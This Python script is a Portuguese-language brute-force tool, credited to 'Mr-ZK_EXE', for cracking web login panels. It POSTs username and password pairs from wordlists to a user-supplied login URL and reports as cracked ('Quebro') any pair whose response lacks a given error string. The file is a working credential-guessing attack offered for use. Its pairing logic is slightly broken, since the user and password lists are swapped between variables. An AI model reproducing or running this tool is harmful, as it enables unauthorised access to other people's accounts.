import requests
import itertools

try:
	print('\033[1;31m ╔╗ ╔╗╔═╗╔╦═╗ ╔╗╔╗      ╔════╦╗╔═╗ ')
	print(' ║║╔╝╚╣╔╝║║║╚╗║║║║      ╚══╗═║║║╔╝ ')
	print(' ║╚╩╗╔╝╚╗║║╔╗╚╝║║╚═╦╗ ╔╗  ╔╝╔╣╚╝╝  ')
	print(' ║╔╗║╠╗╔╣║║║╚╗║║║╔╗║║ ║║ ╔╝╔╝║╔╗║  ')
	print(' ║╚╝║╚╣║╚╝║║ ║║║║╚╝║╚═╝║╔╝═╚═╣║║╚╗ ')
	print(' ╚══╩═╩╩══╩╝ ╚═╝╚══╩═╗╔╝╚════╩╝╚═╝ ')
	print('                   ╔═╝║            ')
	print('                   ╚══╝          v2\n')
	print('\033[1;32mscript Feito por \033[1;31mMr-ZK_EXE')
	print("\033[1;32m Exemplo:\n \033[1;33mlink do painel de login M-POST:\033[1;32m https://www.zkexe.com/login.php\n \033[1;33musuario data:\033[1;32m usuario\n \033[1;33msenha data:\033[1;32m senha\n \033[1;33mUser ou Email WordList:\033[1;32m users.txt\n \033[1;33mSenhas Wordlist:\033[1;32m pass.txt\n \033[1;33mQuando da Error:\033[1;32m error no login da bata user 10\n\n")

	# entradas
	url = input('\033[1;32mlink do painel de login M-POST: \033[1;31m')
	userdata = input('\033[1;32musuario data: \033[1;31m')
	passdata = input('\033[1;32msenha data: \033[1;31m')
	user = input('\033[1;32mUser ou Email WordList: \033[1;31m')
	pw = input('\033[1;32mSenhas Wordlist: \033[1;31m')

	# setlistas 
	diruser = 'WL-user/' + user 
	dirpass = 'WL-pass/' + pw
	file_pw = open(dirpass)
	file_user = open(diruser)

	#Quebrador
	error = input('\033[1;32mQuando da Error: \033[1;31m')
	for uss, pws in  zip(file_pw.readlines(), file_user.readlines()):
		
		uss = uss.rstrip('\n')
		pws = pws.rstrip('\n')
		inf = {userdata : uss, passdata : pws}
		rs = requests.post(url, data=inf)
		
		if error in str(rs.text):
			print("\033[1;31mUser: {} senha: {} Não Quebrada :(".format(uss, pws))
		else:
			print("\033[1;92mUser: {} senha: {} Quebro :)".format(uss, pws))
except KeyboardInterrupt:
	print('\033[1;31m \nVoce me fecho babaca :(')
